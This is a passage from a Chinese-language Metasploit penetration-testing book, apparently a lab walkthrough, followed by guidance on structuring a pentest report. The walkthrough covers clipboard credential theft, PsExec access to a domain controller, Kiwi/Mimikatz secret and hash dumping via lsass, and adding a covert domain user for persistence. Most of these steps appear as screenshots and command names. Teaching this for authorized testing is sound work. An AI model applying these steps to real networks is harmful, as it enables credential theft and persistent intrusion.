好吧，我们只能看到一个用户登录到系统中。让我们使用一些高级的 Metasploit 功能从这个网络中收集有价值的信息。

# 枚举域令牌

让我们看看在受损主机上运行`post/windows/gather/enum_domain_tokens`模块后我们得到了哪些域帐户，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/60825e54-3cb5-416f-bf41-b917bcd8e0db.png)

有趣。我们可以看到`deepankar`帐户是机器的本地管理员；然而，在域组和用户令牌帐户中有一个有趣的条目，即域管理员用户`deep`。这也可能意味着域管理员可能从这台机器上登录。该模块还将列出用户的运行进程，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9defed0c-7a7a-48f6-8f78-8b04367d446d.png)

不错。我们可以看到来自本地和域管理员的进程都在运行。让我们继续枚举域，看看我们是否能找到更多东西。

# 在 Meterpreter 中使用 extapi

Windows Meterpreter 通过扩展 API 提供了许多新功能。扩展 API 提供了对剪贴板操作、查询服务、Windows 枚举和 ADSI 查询的简单访问。

要在 Metasploit 中加载扩展 API，我们只需要使用`load`命令，然后跟着`extapi`，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ed65a22d-a59f-4e99-86c8-09a25ad056fd.png)

运行上述命令在 Meterpreter 控制台中解锁了各种功能，可以通过在 Meterpreter 控制台中输入`?`来查看，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f7a4598b-9253-49a7-96de-8eeb8cb87554.png)

# 使用 Metasploit 枚举打开的 Windows

扩展 API 中的`window_enum`功能为我们提供了受损机器上所有打开的 Windows 的列表。这可能使我们能够更多地了解目标和正在运行的应用程序。让我们看看在目标系统上运行此模块时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c0789c7c-50e3-42d8-8c9d-3fbb6814010a.png)

如建议的那样，我们有目标上所有打开的 Windows 的列表及其当前的进程 ID。让我们再探索一些：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7b311a71-2a77-4eac-b4fd-221187097c57.png)

我们可以看到 Microsoft Word 在目标系统上打开，这表明了机器上存在人的实体。

# 操作剪贴板

由于我们知道有人坐在机器上，而且我们已经拥有了扩展 API 的功能，让我们利用它来操作目标的剪贴板，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/13bc43a1-626a-4cc7-8c89-bf0ad016d51e.png)

嗯嗯！看起来有人正在将凭据复制到某个应用程序中。但等等！`192.168.0.190`是域控制器的 IP 地址。让我们记下这些凭据，因为我们将尝试使用它们进行更复杂的攻击。

# 在 Metasploit 中使用 ADSI 管理命令

我们已经获得了域控制器的一些关键凭据。但是在寻找目标上更多信息的可能性方面，我们不应该限制自己。让我们开始吧：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a7f732e2-7160-418f-b9d6-6ef9602f93c9.png)

我们可以看到在`pyssg.com`域上发出`adsi_computer_enum`命令会枚举出网络上以前未知的许多其他系统。大多数系统都在运行 Windows 10 专业版操作系统。让我们看看我们还能得到什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/31f4daed-e9ed-4069-84db-1dbe1ef16f1e.png)

我们还可以使用`adsi_dc_enum`命令找到域控制器，后面跟着`pyssg.com`，这是前面截图中显示的域名。我们还可以通过使用`adsi_user_enum`命令更好地查看 AD 用户，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ef19a8b0-9f68-4fb5-82fb-4ed38a4d7411.png)

最初，我们看到我们只有一个 OU，也就是域；然而，前面的命令揭示了原始 OU 是 OPS。

# 在网络中使用 PsExec 漏洞

我们在前面的部分注意到了一些凭据。让我们利用它们并尝试使用 Metasploit 中的`psexec`模块访问域控制器。根据微软的网站：

"PsExec 是一个轻量级的 telnet 替代品，它允许您在其他系统上执行进程，包括对控制台应用程序的完全交互，而无需手动安装客户端软件。PsExec 的最强大的用途包括在远程系统上启动交互式命令提示符和远程启用诸如 IpConfig 之类的工具，否则无法显示有关远程系统的信息。"

PsExec 用于通过哈希传递攻击，攻击者无需破解某些系统密码的获得的哈希，哈希本身可以传递以登录到机器并执行任意命令。但由于我们已经有明文凭据，我们可以直接加载模块并运行它以获得对域控制器的访问。让我们设置模块如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3f5abf98-aca5-436d-8c58-1ea71ef95c5d.png)

我们可以看到我们已经设置了所有必需的选项。让我们执行模块并分析输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2b551385-093f-44da-a23c-177f6ac1c7fb.png)

砰！我们已成功访问了域控制器。让我们进行一些后期利用，并看看我们还能得到什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b01f0f44-7842-4dc7-a08e-d8c46a42b12a.png)

是的！我们已经入侵了一个不包含严重漏洞但在权限范围上存在缺陷的 Windows 2016 服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4c9b626d-f484-4df5-885b-d87f20b75e79.png)

我们可以看到我们对服务器有`SYSTEM`级别的访问权限，并且可以在目标上执行几乎任何操作。

# 在 Metasploit 中使用 Kiwi

Metasploit 提供**Mimikatz**和**Kiwi**扩展来执行各种类型的凭据操作，例如转储密码和哈希，转储内存中的密码，生成黄金票据等。让我们在 Metasploit 中加载`kiwi`，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/06c9a49f-bfe6-49a8-b694-0090ac9c7e24.png)

一旦我们加载了`kiwi`模块，我们可以看到我们有一个完整的命令菜单可以使用，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a6217004-4476-48c0-bd35-bdd732856c00.png)

让我们尝试运行`lsa_dump_secrets`命令，并检查我们是否可以转储一些内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7b1fa7c4-c7af-476b-9e35-51388daf655a.png)

中了！我们可以看到我们已成功转储了 NTLM 和 SHA1 哈希以及秘密。我们有大量信息可以获得黄金票据；但是，我们将在接下来的章节中研究如何操纵黄金票据。现在让我们尝试使用`hashdump`命令转储哈希。要转储哈希，我们必须迁移到用户进程。让我们使用`ps`命令拉起进程列表，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/61f2e3ca-1d77-4f5a-92f6-fdd465fa47ce.png)

让我们迁移到运行在进程 ID`576`下的`lsass.exe`进程，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5ebcab40-4f95-47f0-b072-212c58a3d968.png)

哇！我们可以看到成功迁移到`lsass.exe`进程后，运行`hashdump`命令会转储所有用户哈希，我们稍后可以破解。

# 在 Metasploit 中使用 cachedump

由于我们已经获得了良好的访问权限，最好进行`cachedump`以获取凭据，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/869ef393-12ad-48a9-a8c5-7f1c78a8ce11.png)

# 保持对 AD 的访问

我们已经看到我们有许多方法可以在目标系统上实现持久性，我们将在接下来的章节中看到更多方法；但是，在一个拥有许多用户的大型网络中，可能很容易秘密地将一个域用户添加到控制器上，以巩固我们对 AD 网络的访问。让我们加载`post/windows/manage/add_user_domain`模块，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a56ddaee-33b2-4fe1-ae10-eb81f36d5341.png)

我们可以看到我们已经设置了所有必需的选项，如`USERNAME`、`PASSWORD`和`SESSION`。让我们运行这个模块，看看我们的用户是否被添加到域中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ae27790c-2ad7-4237-a6c0-8fc9ab1a7f21.png)

我们可以看到我们已成功将用户 hacker 添加到域`PYSSG`中。我们可以随时轻松地使用这个用户来回登录；但是，我建议将名称与现有用户匹配，因为像*hacker*这样的词会引起一些疑问。

此外，我们可以使用`loot`命令查看所有收集的细节，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f20b2d2c-8807-4dc1-8aea-55ab0705fad3.png)

# 生成手动报告

现在让我们讨论如何创建渗透测试报告，看看应该包括什么，应该在哪里包括，应该添加/删除什么，如何格式化报告，使用图表等等。许多人，如经理、管理员和高级管理人员，都会阅读渗透测试的报告。因此，有必要对发现的问题进行良好的组织，以便目标受众能够正确传达和理解正确的信息。

# 报告的格式

一个好的渗透测试报告可以分解为以下格式：

+   页面设计

+   文件控制：

+   封面

+   文件属性

+   报告内容列表:

+   目录

+   插图列表

+   执行/高层摘要：

+   渗透测试的范围

+   严重信息

+   目标

+   假设

+   漏洞摘要

+   漏洞分布图

+   建议摘要

+   方法论/技术报告

+   测试细节

+   漏洞列表

+   可能性

+   建议

+   参考资料

+   术语表

+   附录

以下是一些重要部分的简要描述：

+   **页面设计**：页面设计指的是选择报告中要使用的字体、页眉和页脚、颜色等

+   **文件控制**：这里涵盖了报告的一般属性

+   **封面**：包括报告的名称、版本、时间和日期、目标组织、序列号等

+   **文件属性**：包括报告的标题、测试人员的姓名以及审阅此报告的人的姓名

+   **报告内容列表**：包含报告的内容，并与之相关联的清晰定义的页码

+   **目录**：这包括从报告开始到结束的所有材料的列表

+   **插图列表**：报告中使用的所有图表都应在此部分列出，并附有适当的页码

# 执行摘要

**执行摘要**包括了报告的总体摘要和非技术性术语，并专注于向公司的高级员工提供知识。它包含以下信息：

+   **渗透测试的范围**：这一部分包括进行的分析类型和测试的系统。在这一部分列出了测试的所有 IP 范围。此外，这一部分包含了关于测试的严重性信息。

+   **目标**：这一部分定义了测试将如何帮助目标组织，测试的好处等等。

+   **假设**：如果在测试过程中做出了任何假设，都需要在这里列出。假设在测试网站时发现了管理员面板中的 XSS 漏洞，但要执行它，我们需要以管理员权限登录。在这种情况下，需要做出的假设是我们需要管理员权限进行攻击。

+   **漏洞摘要**：以表格形式提供信息，并描述根据其风险级别（高、中、低）发现的漏洞数量。它们根据影响程度排序，从对资产影响最大的弱点到对影响最小的弱点。此外，该阶段还包含了多个系统的多个问题的漏洞分布图表。以下是一个示例：

| **影响** | **漏洞数量** |
| --- | --- |
| 高 | 19 |
| 中 | 15 |
| 低 | 10 |

+   **建议摘要**：此部分的建议仅适用于影响因子最高的漏洞，并且它们应相应列出。

# 方法论/网络管理员级报告

报告的这一部分包括渗透测试期间要执行的步骤，漏洞的深入细节以及建议。以下项目符号列表详细说明了管理员感兴趣的部分：

+   **测试细节**：报告的这一部分包括与测试总结相关的信息，以图表和表格的形式呈现漏洞、风险因素以及受这些漏洞感染的系统的信息。

+   **漏洞清单**：报告的这一部分包括漏洞的详细信息、位置以及主要原因。

+   **可能性**：这一部分解释了这些漏洞被攻击者针对的可能性。这是通过分析触发特定漏洞的易用性来完成的，并通过找出可以针对漏洞进行的最简单和最困难的测试来找出最容易和最困难的测试。

+   **建议**：此部分列出了修补漏洞的建议。如果渗透测试不建议修补程序，则只被视为半成品。

# 其他部分

+   **参考**：在制作报告时使用的所有参考资料都应在此列出。例如书籍、网站、文章等的参考资料都应明确列出，包括作者、出版物名称、出版年份或文章发表日期等。

+   **术语表**：报告中使用的所有技术术语都应在此列出并附上它们的含义。

+   **附录**：这一部分是添加不同脚本、代码和图像的绝佳位置。

# 摘要

在本章中，我们看到了如何使用 OpenVAS 内置连接器和各种 Metasploit 扩展有效地对网络进行渗透测试，以及如何生成测试的适当报告。我们还有许多其他连接器可供使用，例如 Nessus、SQLMAP 等，我们将在接下来的章节中继续研究它们。

在下一章中，我们将看到如何使用 Metasploit 进行客户端攻击，并通过社会工程和有效载荷传递获取无法渗透的目标的访问权限。
